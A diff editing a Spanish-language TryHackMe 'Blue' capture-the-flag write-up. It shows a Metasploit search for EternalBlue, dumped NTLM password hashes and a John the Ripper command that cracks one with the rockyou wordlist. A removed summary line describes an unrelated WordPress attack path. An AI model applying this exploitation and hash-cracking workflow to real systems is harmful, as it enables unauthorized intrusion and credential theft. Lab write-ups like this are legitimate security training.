@@ -1,13 +1,13 @@
 # Blue — Writeup
 
-**Fecha:** 5-10-2025\
+**Fecha:** 10-10-2025\
 **Plataforma:** TryHackMe
 
 ---
 
 ## TL;DR
 
-Se encontró un WordPress vulnerable, se obtuvieron credenciales por fuerza bruta, se subió un reverse shell editando la plantilla 404, se consiguió shell como www-data, se mejoró a TTY interactiva y se explotó /usr/bin/find con SUID para elevar a root y leer las flags.
+
 
 ---
 
@@ -41,7 +41,7 @@ PORT      STATE SERVICE      VERSION
 ## Foothold (Metasploit)
 **Search Exploit**
 ```bash
-  msfconsole
+  $ msfconsole
   msf > search windows 7 eternalblue
 #   Name                                           Disclosure Date  Rank     Check  Description
    -   ----                                           ---------------  ----     -----  -----------
@@ -125,9 +125,11 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
+
 **Cracking**
 ```bash
-	john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT userhash.txt
+$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > userhash.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT userhash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
 Warning: no OpenMP support for this hash type, consider --fork=2
